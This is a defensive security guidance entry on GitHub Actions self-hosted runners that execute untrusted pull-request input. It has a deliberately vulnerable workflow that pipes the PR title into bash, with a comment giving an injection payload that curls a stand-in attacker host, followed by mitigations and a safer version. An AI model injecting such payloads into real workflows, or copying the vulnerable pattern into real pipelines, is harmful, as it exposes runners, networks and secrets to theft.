# Self Hosted Runner Untrusted Code

## Description

Self-hosted runners that execute potentially untrusted user input (from pull requests, issues, or workflow inputs) create extreme security risks: attackers can inject malicious code through user input, injected code runs with full access to your self-hosted runner, and attackers can access your network, secrets, and internal resources. User input should never be executed directly on self-hosted infrastructure without strict validation and sanitization. [^gh_runners]

## Vulnerable Instance

- Workflow uses user input from PRs, issues, or workflow inputs in commands on self-hosted runners.
- Input is used directly without validation or sanitization.
- Attacker can inject malicious code.

```yaml
name: Process PR
on:
  pull_request:
jobs:
  process:
    runs-on: self-hosted  # Dangerous with user input
    steps:
      - name: Process PR title
        run: |
          echo "${{ github.event.pull_request.title }}" | bash
          # Attacker can inject: "; curl attacker.com/steal; #"
```

## Mitigation Strategies

1. **Sanitize all user inputs**  
   Validate inputs against allowlists, escape special characters, and use parameterized commands. Never execute user input directly.

2. **Use environment variables**  
   Pass user input via environment variables and avoid direct interpolation in commands. Use proper quoting and escaping.

3. **Switch to GitHub-hosted runners for untrusted input**  
   Use GitHub-hosted runners for PR/issue workflows. Only use self-hosted runners for trusted events (push, workflow_dispatch).

4. **Implement input validation**  
   Validate all user inputs before use, reject suspicious patterns, and use type checking and constraints. Whitelist allowed characters and patterns.

5. **Restrict self-hosted runners to trusted events**  
   Never allow pull_request, issues, or other user-controllable triggers on self-hosted runners. Use runner groups to enforce this.

6. **Isolate and monitor**  
   If you must process untrusted input, isolate self-hosted runners in separate networks and monitor for suspicious activity.

### Secure Version

```yaml
name: Process PR Safely
on:
  pull_request:
jobs:
  process:
    runs-on: ubuntu-latest  # GitHub-hosted for untrusted input
    steps:
      - name: Process PR title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          # Validate input
          if [[ ! "$PR_TITLE" =~ ^[a-zA-Z0-9\s-]+$ ]]; then
            echo "Invalid input"
            exit 1
          fi
          echo "Processing: $PR_TITLE"
```

## Impact

| Dimension | Severity | Notes |
| --- | --- | --- |
| Likelihood | ![Medium](https://img.shields.io/badge/-Medium-yellow?style=flat-square) | User input on self-hosted runners is less common but creates extreme risk when present. |
| Risk | ![Critical](https://img.shields.io/badge/-Critical-red?style=flat-square) | Injected code runs with full access to self-hosted infrastructure, enabling network access, secret exfiltration, and system compromise. |
| Blast radius | ![Wide](https://img.shields.io/badge/-Wide-yellow?style=flat-square) | Compromised self-hosted runners can affect all systems the runner can access, including internal networks, databases, and services. |

## References

- GitHub Docs, "About self-hosted runners," https://docs.github.com/en/actions/hosting-your-own-runners/about-self-hosted-runners [^gh_runners]

---

[^gh_runners]: GitHub Docs, "About self-hosted runners," https://docs.github.com/en/actions/hosting-your-own-runners/about-self-hosted-runners
